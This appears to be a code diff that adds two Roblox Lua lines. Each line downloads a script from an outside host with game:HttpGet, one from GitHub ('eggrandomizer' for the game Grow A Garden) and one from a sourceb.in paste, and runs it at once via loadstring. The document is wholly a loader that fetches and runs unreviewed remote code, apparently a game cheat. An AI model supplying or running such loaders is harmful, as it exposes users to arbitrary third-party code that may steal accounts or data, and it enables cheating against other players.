@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuuhayate2/GrowAGarden1/refs/heads/main/eggrandomizer"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pcne3gIxvJ/0", true))()
